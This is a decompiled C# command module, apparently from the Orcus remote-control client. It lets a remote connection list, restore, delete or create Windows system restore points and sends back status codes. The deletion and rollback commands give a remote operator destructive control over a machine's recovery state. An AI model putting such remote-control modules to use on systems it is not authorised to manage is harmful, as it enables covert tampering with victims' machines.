using System;
using System.Collections.Generic;
using System.Text;
using Orcus.Plugins;
using Orcus.Shared.Commands.SystemRestore;
using Orcus.Shared.NetSerializer;

namespace Orcus.Commands.SystemRestore;

public class SystemRestoreCommand : Command
{
	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected I4, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		SystemRestoreCommunication val = (SystemRestoreCommunication)parameter[0];
		switch ((int)val)
		{
		case 0:
			try
			{
				List<SystemRestorePointInfo> systemRestorePoints = SystemRestoreUtilities.GetSystemRestorePoints();
				foreach (SystemRestorePointInfo item in systemRestorePoints)
				{
					item.set_CreationDate(item.get_CreationDate().ToUniversalTime());
				}
				((Command)this).ResponseBytes((byte)4, new Serializer(typeof(List<SystemRestorePointInfo>)).Serialize((object)systemRestorePoints), connectionInfo);
				break;
			}
			catch (Exception)
			{
				((Command)this).ResponseByte((byte)5, connectionInfo);
				break;
			}
		case 1:
		{
			uint sequenceNumber = BitConverter.ToUInt32(parameter, 1);
			((Command)this).ResponseByte((byte)6, connectionInfo);
			bool flag = SystemRestoreUtilities.Restore(sequenceNumber);
			((Command)this).ResponseByte((byte)(flag ? 7u : 8u), connectionInfo);
			break;
		}
		case 2:
		{
			bool flag = SystemRestoreUtilities.RemoveRestorePoint(BitConverter.ToUInt32(parameter, 1));
			((Command)this).ResponseByte((byte)(flag ? 9u : 10u), connectionInfo);
			break;
		}
		case 3:
		{
			RestoreType restoreType = (RestoreType)parameter[1];
			EventType eventType = (EventType)parameter[2];
			string @string = Encoding.UTF8.GetString(parameter, 3, parameter.Length - 3);
			((Command)this).ResponseByte((byte)11, connectionInfo);
			bool flag = SystemRestoreUtilities.CreateRestorePoint(@string, restoreType, eventType);
			((Command)this).ResponseByte((byte)(flag ? 12u : 13u), connectionInfo);
			break;
		}
		}
	}

	protected override uint GetId()
	{
		return 28u;
	}
}
